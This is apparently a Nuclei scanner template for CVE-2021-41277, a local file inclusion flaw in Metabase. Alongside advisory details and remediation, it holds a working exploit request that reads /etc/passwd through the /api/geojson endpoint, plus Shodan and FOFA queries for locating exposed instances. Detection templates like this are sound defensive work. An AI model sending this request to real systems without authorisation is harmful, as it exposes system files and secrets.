id: CVE-2021-41277

info:
  name: Metabase Local File Inclusion
  author: 0x_Akoko
  severity: high
  description: Metabase is an open source data analytics platform. In affected versions a local file inclusion security issue has been discovered with the custom GeoJSON map (`admin->settings->maps->custom maps->add a map`) support and potential local file inclusion (including environment variables). URLs were not validated prior to being loaded.
  remediation: This issue is fixed in 0.40.5 and .40.5 and higher. If you are unable to upgrade immediately, you can mitigate this by including rules in your reverse proxy or load balancer or WAF to provide a validation filter before the application.
  reference:
    - https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41277
    - https://twitter.com/90security/status/1461923313819832324
    - https://github.com/metabase/metabase/commit/042a36e49574c749f944e19cf80360fd3dc322f0
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-41277
    cwe-id: CWE-22,CWE-200
    epss-score: 0.06768
    epss-percentile: 0.93145
    cpe: cpe:2.3:a:metabase:metabase:0.40.0:-:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: metabase
    product: metabase
    shodan-query: http.title:"Metabase"
    fofa-query: app="Metabase"
  tags: cve,cve2021,metabase,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/geojson?url=file:///etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
# digest: 4a0a0047304502205f2dcecf7c05055ec47dcec4cd53d5e58de7b0f25f883e7f7d005228c6d7234a022100e87ad56a4910dd051ade88c2f4ca2146a4d027e7167219b31fdfa5bd7d7e6c1e:922c64590222798bb761d5b6d8e72950